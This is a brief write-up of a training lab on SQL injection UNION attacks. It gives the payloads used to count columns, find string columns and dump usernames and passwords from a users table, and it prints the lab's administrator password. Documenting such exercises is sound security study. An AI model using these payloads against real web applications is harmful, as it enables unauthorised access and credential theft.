# Lab 5 - SQL injection UNION attack, retrieving data from other tables

**Status**: Solved the 1st August 2023.

**Objective**: Retrieve the `username` and `password` from the `users` table, and log in as the `administrator` user.

## Solving Process

- First, the number of columns has to be determined, the following payload was the one that didn't returned an error message:
  - `'+UNION+SELECT+NULL,NULL--`
  - The number of columns is 2
- The next step is to check which columns support strings. And by inserting a string in each column position, the following payload returned no error:
  - `'+UNION+SELECT+'abc','def'--`
  - So both columns support string
- Now, the `username` and `password` can be outputted in both columns. The following payload worked to retrieve the information we're looking for:
  - `'+UNION+SELECT+username,+password+FROM+users--`
  - The returned password for `administrator` is: `d9g1eezpdbgjng52n3dd`
- By entering the credentials `administrator : d9g1eezpdbgjng52n3dd` we've successfully logged in.
